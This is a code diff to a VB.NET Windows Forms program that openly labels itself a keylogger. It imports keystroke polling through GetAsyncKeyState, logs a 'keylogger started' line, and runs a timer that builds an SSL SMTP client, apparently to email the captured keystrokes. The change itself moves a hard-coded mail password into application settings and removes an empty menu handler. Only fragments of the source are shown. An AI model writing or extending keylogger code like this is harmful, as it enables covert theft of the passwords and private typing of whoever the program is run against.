@@ -1,11 +1,14 @@
 ﻿Option Strict On
 Imports System.Net.Mail
 Public Class Form1
+
     Dim mails As String = My.Settings.mail
-    Dim pass As String = "123"
+    Dim pass As String = My.Settings.mailpass
+
 
     Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer
     Private Sub tmrEmail_Tick(sender As Object, e As EventArgs) Handles tmrEmail.Tick
+
         Try
             Dim smtpserver As New SmtpClient
             smtpserver.EnableSsl = True
@@ -64,9 +67,7 @@ Public Class Form1
         txtLogs.Text = "keylogger started at: " & Now & vbNewLine
 
 
-    End Sub
-
-    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs)
 
     End Sub
+
 End Class
